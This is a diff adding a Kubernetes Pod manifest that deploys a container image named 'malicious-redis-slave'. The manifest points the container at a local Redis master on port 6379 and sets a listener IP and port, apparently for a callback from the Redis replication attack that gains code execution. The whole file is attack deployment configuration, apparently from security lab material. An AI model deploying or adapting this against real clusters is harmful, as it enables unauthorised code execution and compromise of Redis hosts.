@@ -1,0 +1,31 @@
+{
+    "kind": "Pod",
+    "apiVersion": "v1",
+    "metadata": {
+        "name": "mal-redis"
+    },
+    "spec": {
+        "containers": [{
+            "name": "mal-redis",
+            "image": "we45/malicious-redis-slave",
+            "env": [
+              {
+                "name": "MASTERHOST",
+                "value": "127.0.0.1"
+              },
+              {
+                "name": "MASTERPORT",
+                "value": "6379"
+              },
+              {
+                "name": "LISTENER_IP",
+                "value": "192.168.1.5"
+              },
+              {
+                "name": "LISTENER_PORT",
+                "value": "3999"
+              }
+            ]
+        }]
+    }
+}
